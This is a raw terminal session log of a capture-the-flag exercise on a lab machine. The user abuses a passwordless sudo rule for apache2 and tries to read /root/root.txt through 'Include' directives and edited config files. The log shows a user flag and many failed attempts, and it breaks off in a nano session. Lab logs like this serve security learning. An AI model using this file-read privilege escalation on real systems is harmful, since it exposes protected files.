@@ -1,0 +1,276 @@
+Script started on 2025-03-15 16:07:36+03:00 [COMMAND="ssh -i robots.dolivaw dolivaw@robots.thm" TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="104" LINES="27"]
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ ls
+[?2004luser.txt
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat user.txt
+[?2004lTHM{9b17d3c3e86c944c868c57b5a7fa07d8}[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ ls
+[?2004luser.txt
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo -l
+[?2004lMatching Defaults entries for dolivaw on ubuntu-jammy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dolivaw may run the following commands on ubuntu-jammy:
+    (ALL) NOPASSWD: /usr/sbin/apache2
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7mLFILE=file_to_read[27m            !root!er        /root/root.txt
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7mapache2ctl -c "Include $LFILE" -k stop[27mapache2ctl -c "Include $LFILE" -k stop
+[?2004lapache2: Syntax error in -C/-c directive: Could not open configuration file /root/root.txt: Permission denied
+Action '-c Include /root/root.txt -k stop' failed.
+The Apache error log may have more information.
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ apache2ctl -c "Include $LFILE" -k stop[1@s[1@u[1@d[1@o[1@ 
+[?2004l[sudo] password for dolivaw: 
+sudo: a password is required
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2ctl -c "Include $LFILE" -k stop[1P[1P[1P
+[?2004l[Sat Mar 15 13:10:10.814787 2025] [core:warn] [pid 2006] AH00111: Config variable ${APACHE_RUN_DIR} is not defined
+apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7msudo apache2 -c "Include $LFILE" -k stop -D DefaultRuntimeDir=/var/run/apache2[27msudo apache2 -c "Include $LFILE" -k stop -D DefaultRuntimeDir=/var/run/apache2
+[?2004l[Sat Mar 15 13:10:49.074705 2025] [core:warn] [pid 2009] AH00111: Config variable ${APACHE_RUN_DIR} is not defined
+apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [K[7mecho "DefaultRuntimeDir /var/run/apache2" > /home/dolivaw/temp_config.conf[27mecho "DefaultRuntimeDir /var/run/apache2" > /home/dolivaw/temp_config.conf
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [K[7msudo apache2 -c "Include /home/dolivaw/temp_config.conf" -c "Include $LFILE" -k [27m[7ms[27m[7mstop[27m[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2 -c "Include /home/dolivaw/temp_config.conf" -c "Include $LFILE" -k stop
+[?2004l[Sat Mar 15 13:11:33.014802 2025] [core:warn] [pid 2013] AH00111: Config variable ${APACHE_RUN_DIR} is not defined
+apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Kls -l
+[?2004ltotal 8
+-rw-r--r-- 1 dolivaw dolivaw 35 Mar 15 13:11 temp_config.conf
+-rw-r--r-- 1 root    root    37 Aug 19  2024 user.txt
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ ls -l   [7m /etc/apache2/apache2.conf[27m /etc/apache2/apache2.conf
+[?2004l-rw-r--r-- 1 root root 7224 Jul 17  2024 /etc/apache2/apache2.conf
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7mecho "DefaultRuntimeDir /var/run/apache2" >[27mecho "DefaultRuntimeDir /var/run/apache2" >> [7m/etc/apache2/apache2.conf[27m/etc/apache2/apache2.conf
+[?2004l-bash: /etc/apache2/apache2.conf: Permission denied
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Kcat     [7mcat /var/log/apache2/error.log[27mcat /var/log/apache2/error.log
+[?2004lcat: /var/log/apache2/error.log: Permission denied
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7msudo mkdir -p /var/run/apache2[27msudo mkdir -p /var/run/apache2
+[?2004l[sudo] password for dolivaw: 
+sudo: a password is required
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo mkdir -p /var/run/apache2sudo [5P
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7msudo APACHE_RUN_DIR=/var/run/apache2 apache2 -c "Include $LFILE" -k stop[27msudo APACHE_RUN_DIR=/var/run/apache2 apache2 -c "Include $LFILE" -k stop
+[?2004lsudo: sorry, you are not allowed to set the following environment variables: APACHE_RUN_DIR
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [K[7mecho "APACHE_RUN_DIR=/var/run/apache2" > /home/dolivaw/apache_config_override.co[27m[7mn[27m[7mnf[27m[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ echo "APACHE_RUN_DIR=/var/run/apache2" > /home/dolivaw/apache_config_override.conf
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [K[7mLFILE=/root/root.txt[27m
+[7msudo apache2 -f /home/dolivaw/apache_config_override.conf -c "Include $LFILE" -k stop[27m
+[A[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ LFILE=/root/root.txt
+sudo apache2 -f /home/dolivaw/apache_config_override.conf -c "Include $LFILE" -k stop
+[A
+[?2004lAH00534: apache2: Configuration error: No MPM loaded.
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Kls
+[?2004lapache_config_override.conf  temp_config.conf  user.txt
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ rm *.conf
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat [7m/etc/apache2/apache2.conf[27m/etc/apache2/apache2.conf > apache.conf
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ ls
+[?2004lapache.conf  user.txt
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7mecho "APACHE_RUN_DIR=/var/run/apache2" >[27mecho "APACHE_RUN_DIR=/var/run/apache2" >> apache.conf 
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7msudo apache2 -f /home/dolivaw/apache_config_override.conf -c "Include $LFILE" -k[27m[7m [27m[7m stop[27m[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2 -f /home/dolivaw/apache_config_override.conf -c "Include $LFILE" -k stop[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2 -f /home/dolivaw/apache_config_override.conf -c "Include $LFILE" -rride.conf -c "Include $LFILE" -k s[1P[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2 -f /home/dolivaw/apache_config_overrid.conf -c "Include $LFILE" -k st[1P[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2 -f /home/dolivaw/apache_config_overri.conf -c "Include $LFILE" -k sto[1Pp[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2 -f /home/dolivaw/apache_config_overr.conf -c "Include $LFILE" -k stop[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2 -f /home/dolivaw/apache_config_over.conf -c "Include $LFILE" -k stop [K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2 -f /home/dolivaw/apache_config_ove[1P
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sudo apache2 -f /home/dolivaw/apache_config_ov[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P
+[?2004l[Sat Mar 15 13:15:30.290431 2025] [core:warn] [pid 2033] AH00111: Config variable ${APACHE_RUN_DIR} is not defined
+apache2: Syntax error on line 80 of /home/dolivaw/apache.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Kcat apache.conf | grep [7msudo apache2 -f /home/dolivaw/apache_config_override.conf[27m[7m [27m[7m -c "Include $LFILE" -k stop[27m                            [A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat apache.conf | grep sudo apache2 -f /home/dolivaw/apache_config_override.conf [K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat apache.conf | grep sudo apache2 -f /home/dolivaw/apache_config_override.con[K
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat apache.conf | grep sudo apache2 -f /home/dolivaw/apache_config_override.con                                                          [7mDefaultRuntimeDir[27mDefaultRuntimeDir
+[?2004l[01;31m[KDefaultRuntimeDir[m[K ${APACHE_RUN_DIR}
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat apache.conf | grep DefaultRuntimeDir                 [7mAPACHE_RUN_DIR[27mAPACHE_RUN_DIR
+[?2004lDefaultRuntimeDir ${[01;31m[KAPACHE_RUN_DIR[m[K}
+[01;31m[KAPACHE_RUN_DIR[m[K=/var/run/apache2
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7msed -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache[27m[7m2[27m[7m2|' apache.conf[27m[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sed -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache2|' apache.conf
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Ksed -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache22|' apache.conf[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [43Pcat apache.conf | grep APACHE_RUN_DIR
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat apache.conf | grep APACHE_RUN_DIRDefaultRuntimeDirsudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop[15Pecho "APACHE_RUN_DIR=/var/run/apache2" >> apache.conf sudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop
+[?2004l[Sat Mar 15 13:19:22.548007 2025] [core:warn] [pid 2049] AH00111: Config variable ${APACHE_PID_FILE} is not defined
+[Sat Mar 15 13:19:22.548079 2025] [core:warn] [pid 2049] AH00111: Config variable ${APACHE_RUN_USER} is not defined
+[Sat Mar 15 13:19:22.548085 2025] [core:warn] [pid 2049] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
+[Sat Mar 15 13:19:22.548098 2025] [core:warn] [pid 2049] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:19:22.551176 2025] [core:warn] [pid 2049:tid 139875753437056] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:19:22.551419 2025] [core:warn] [pid 2049:tid 139875753437056] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:19:22.551444 2025] [core:warn] [pid 2049:tid 139875753437056] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+AH00543: apache2: bad user name ${APACHE_RUN_USER}
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Krm apache.conf 
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ ls
+[?2004luser.txt
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ lsrm apache.conf sudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stoped -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache22|' apache.conf[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [43Pcat apache.conf | grep APACHE_RUN_DIR
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat apache.conf | grep APACHE_RUN_DIRDefaultRuntimeDirsudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop[15Pecho "APACHE_RUN_DIR=/var/run/apache2" >> apache.conf ls[Kcat /etc/apache2/apache2.conf > apache.conf
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat /etc/apache2/apache2.conf > apache.confls[Krm apache.conf ls[Kcat /etc/apache2/apache2.conf > apache.conf[K[7msed -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache[27m[7m2[27m[7m2|' apache.conf[27m[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sed -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache2|' apache.conf
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Ksed -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache22|' apache.conf[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [37Pcat /etc/apache2/apache2.conf > apache.conf
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat /etc/apache2/apache2.conf > apache.confls[Krm apache.conf sudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop
+[?2004l[Sat Mar 15 13:20:11.128382 2025] [core:warn] [pid 2058] AH00111: Config variable ${APACHE_PID_FILE} is not defined
+[Sat Mar 15 13:20:11.128443 2025] [core:warn] [pid 2058] AH00111: Config variable ${APACHE_RUN_USER} is not defined
+[Sat Mar 15 13:20:11.128449 2025] [core:warn] [pid 2058] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
+[Sat Mar 15 13:20:11.128467 2025] [core:warn] [pid 2058] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:20:11.131495 2025] [core:warn] [pid 2058:tid 139621586716544] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:20:11.131749 2025] [core:warn] [pid 2058:tid 139621586716544] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:20:11.131772 2025] [core:warn] [pid 2058:tid 139621586716544] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+AH00543: apache2: bad user name ${APACHE_RUN_USER}
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Krm apache.conf 
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ ls
+[?2004luser.txt
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ lsrm apache.conf sudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stoped -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache22|' apache.conf[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [37Pcat /etc/apache2/apache2.conf > apache.conf
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat /etc/apache2/apache2.conf > apache.conf
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7msed -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache[27m[7m2[27m[7m2|' apache.conf[27m[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [K
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat /etc/apache2/apache2.conf > apache.confls[Krm apache.conf sudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stoped -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache22|' apache.conf[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [37Pcat /etc/apache2/apache2.conf > apache.conf
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat /etc/apache2/apache2.conf > apache.confls[Krm apache.conf sudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stoped -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache22|' apache.conf[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [43Pcat apache.conf | grep APACHE_RUN_DIR
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ cat apache.conf | grep APACHE_RUN_DIRDefaultRuntimeDirsudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop[15Pecho "APACHE_RUN_DIR=/var/run/apache2" >> apache.conf 
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ echo "APACHE_RUN_DIR=/var/run/apache2" >> apache.conf [11Pcat /etc/apache2/apache2.conf > apache.confls[Krm apache.conf sudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stoped -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache22|' apache.conf
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [K[7mecho "APACHE_RUN_USER=www-data" >> /home/dolivaw/apache.conf[27m
+[7mecho "APACHE_RUN_GROUP=www-data" >> /home/dolivaw/apache.conf[27m
+[7mecho "APACHE_PID_FILE=/var/run/apache2/apache2.pid" >> /home/dolivaw/apache.conf[27m
+[7mecho "APACHE_LOG_DIR=/var/log/apache2" >> /home/dolivaw/apache.conf[27m
+[A[A[A[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ echo "APACHE_RUN_USER=www-data" >> /home/dolivaw/apache.conf
+echo "APACHE_RUN_GROUP=www-data" >> /home/dolivaw/apache.conf
+echo "APACHE_PID_FILE=/var/run/apache2/apache2.pid" >> /home/dolivaw/apache.conf
+echo "APACHE_LOG_DIR=/var/log/apache2" >> /home/dolivaw/apache.conf
+[A
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Kecho "APACHE_LOG_DIR=/var/log/apache2" >> /home/dolivaw/apache.confPID_FILE=/var/run/apache2/apache2.pid" >> /home/dolivaw/apache.conf [A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ echo "APACHE_[19PRUN_GROUP=www-data
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ echo "APACHE_RUN_GROUP=www-data" >> /home/dolivaw/apache.conf[1PUSER=www-data" >> /home/dolivaw/apache.confsed -i 's|DefaultRuntimeDir \${APACHE_RUN_DIR}|DefaultRuntimeDir /var/run/apache22|' apache.conf[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [26Pecho "APACHE_RUN_DIR=/var/run/apache2" >> apache.conf 
+[K[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ echo "APACHE_RUN_DIR=/var/run/apache2" >> apache.conf [11Pcat /etc/apache2/apache2.conf > apache.confls[Krm apache.conf sudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop
+[?2004l[Sat Mar 15 13:22:07.345603 2025] [core:warn] [pid 2069] AH00111: Config variable ${APACHE_PID_FILE} is not defined
+[Sat Mar 15 13:22:07.345675 2025] [core:warn] [pid 2069] AH00111: Config variable ${APACHE_RUN_USER} is not defined
+[Sat Mar 15 13:22:07.345680 2025] [core:warn] [pid 2069] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
+[Sat Mar 15 13:22:07.345716 2025] [core:warn] [pid 2069] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:22:07.348853 2025] [core:warn] [pid 2069:tid 139862634932096] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:22:07.349029 2025] [core:warn] [pid 2069:tid 139862634932096] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:22:07.349051 2025] [core:warn] [pid 2069:tid 139862634932096] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+AH00543: apache2: bad user name ${APACHE_RUN_USER}
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [K[7mcat /home/dolivaw/apache.conf | grep APACHE_RUN[27mcat /home/dolivaw/apache.conf | grep APACHE_RUN
+[?2004lUser ${[01;31m[KAPACHE_RUN[m[K_USER}
+Group ${[01;31m[KAPACHE_RUN[m[K_GROUP}
+[01;31m[KAPACHE_RUN[m[K_DIR=/var/run/apache2
+[01;31m[KAPACHE_RUN[m[K_USER=www-data
+[01;31m[KAPACHE_RUN[m[K_GROUP=www-data
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7msed -i 's|\${APACHE_RUN_USER}|www-data|' /home/dolivaw/apache.conf[27m
+[7msed -i 's|\${APACHE_RUN_GROUP}|www-data|' /home/dolivaw/apache.conf[27m
+[A[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ sed -i 's|\${APACHE_RUN_USER}|www-data|' /home/dolivaw/apache.conf
+sed -i 's|\${APACHE_RUN_GROUP}|www-data|' /home/dolivaw/apache.conf
+[A
+[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [K[7mcat /home/dolivaw/apache.conf | grep APACHE_RUN[27mcat /home/dolivaw/apache.conf | grep APACHE_RUN
+[?2004l[01;31m[KAPACHE_RUN[m[K_DIR=/var/run/apache2
+[01;31m[KAPACHE_RUN[m[K_USER=www-data
+[01;31m[KAPACHE_RUN[m[K_GROUP=www-data
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7msudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop[27msudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop
+[?2004l[Sat Mar 15 13:23:27.245386 2025] [core:warn] [pid 2078] AH00111: Config variable ${APACHE_PID_FILE} is not defined
+[Sat Mar 15 13:23:27.245458 2025] [core:warn] [pid 2078] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:23:27.248617 2025] [core:warn] [pid 2078:tid 140635498903424] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:23:27.248832 2025] [core:warn] [pid 2078:tid 140635498903424] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:23:27.248860 2025] [core:warn] [pid 2078:tid 140635498903424] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+AH00526: Syntax error on line 228 of /home/dolivaw/apache.conf:
+Invalid command 'APACHE_RUN_DIR=/var/run/apache2', perhaps misspelled or defined by a module not included in the server configuration
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Kls /vR/  ar/run | grep apache
+[?2004l[01;31m[Kapache[m[K2
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7mnano /home/dolivaw/apache.conf[27mnano /home/dolivaw/apache.conf
+[?2004l[?2004h[?1049h[22;0;0t[1;27r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[25;46H(B[0;7m[ Reading... ](B[m[25;44H(B[0;7m[ Read 232 lines ](B[m[H(B[0;7m  GNU nano 6.2 [27b/home/dolivaw/apache.conf [35b [1;103H(B[m[26d(B[0;7m^G(B[m Help[15G(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[26;57H(B[0;7m^T(B[m Execute    (B[0;7m^C(B[m Location   (B[0;7mM-U(B[m Undo[27d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste[57G(B[0;7m^J(B[m Justify    (B[0;7m^/(B[m Go To Line (B[0;7mM-E(B[m Redo[2d[36m# This is the main Apache server configuration file.  It contains the[3d# configuration directives that give the server its instructions.[4d# See http://httpd.apache.org/docs/2.4/ for detailed information about[5d# the directives and /usr/share/doc/apache2/README.Debian about Debian specific[6d# hints.[7d#[8d#[9d# Summary of how the Apache 2 configuration works in Debian:[10d# The Apache 2 web server configuration in Debian is quite different to[11d# upstream's suggested way to configure the web server. This is because Debian's[12d# default Apache2 installation attempts to make adding and removing modules,[13d# virtual hosts, and extra configuration directives as flexible as possible, in[14d# order to make automating the changes and administering the server as easy as[15d# possible.[17d# It is split into several files forming the configuration hierarchy outlined[18d# below, all located in the /etc/apache2/ directory:[19d#[20d#[38;5;208m [6b[36m/etc/apache2/[21d#[38;5;208m [6b[36m|-- apache2.conf[22d#[38;5;208m [6b[36m|[38;5;208m [6b[36m`--  ports.conf[23d#[38;5;208m [6b[36m|-- mods-enabled[24d#[38;5;208m [6b[36m|[38;5;208m [6b[36m|-- *.load